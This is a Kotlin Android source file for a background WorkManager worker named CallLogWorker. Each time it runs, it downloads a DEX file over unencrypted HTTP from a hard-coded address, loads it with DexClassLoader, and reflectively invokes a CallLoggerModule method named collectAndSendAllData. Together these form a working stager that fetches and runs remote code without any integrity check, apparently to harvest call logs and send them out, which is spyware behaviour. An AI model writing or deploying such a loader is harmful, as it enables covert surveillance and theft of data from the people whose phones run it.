package com.example.myapplication.calllogservice


import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import dalvik.system.DexClassLoader
import java.io.File
import java.io.FileNotFoundException
import java.io.IOException
import java.net.URL

class CallLogWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    override fun doWork(): Result {
        Log.d("WORKER", "Запустился Worker")

        val dexPath = File(applicationContext.cacheDir, "calllogger.dex")
        if (downloadDex(dexPath)) {
            loadAndRunDex(dexPath)
        }
        return Result.success()
    }


    private fun downloadDex(dexFile: File): Boolean {
        return try {
            dexFile.parentFile?.mkdirs()

            val tempFile = File.createTempFile("temp_dex", ".dex", applicationContext.cacheDir)
            val url = URL("http://192.168.0.101:3000/get-latest-dex")

            url.openStream().use { input ->
                tempFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }

            if (tempFile.length() == 0L) throw IOException("Empty DEX file")

            tempFile.copyTo(dexFile, overwrite = true)
            tempFile.delete()

            dexFile.setReadable(true, false)
            dexFile.setWritable(false, false)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }


    private fun loadAndRunDex(dexFile: File) {
        try {
            if (!dexFile.exists()) throw FileNotFoundException("DEX not found")

            val optimizedDir = applicationContext.codeCacheDir

            val classLoader = DexClassLoader(
                dexFile.absolutePath,
                optimizedDir.absolutePath,
                null,
                javaClass.classLoader
            )

            val clazz = classLoader.loadClass("com.example.dexmodule.CallLoggerModule")
            val method = clazz.getMethod("collectAndSendAllData", Context::class.java)
            method.invoke(clazz.getDeclaredConstructor().newInstance(), applicationContext)
        } catch (e: Exception) {
            Log.e("DEX_LOAD", "Error loading module", e)
        }
    }
}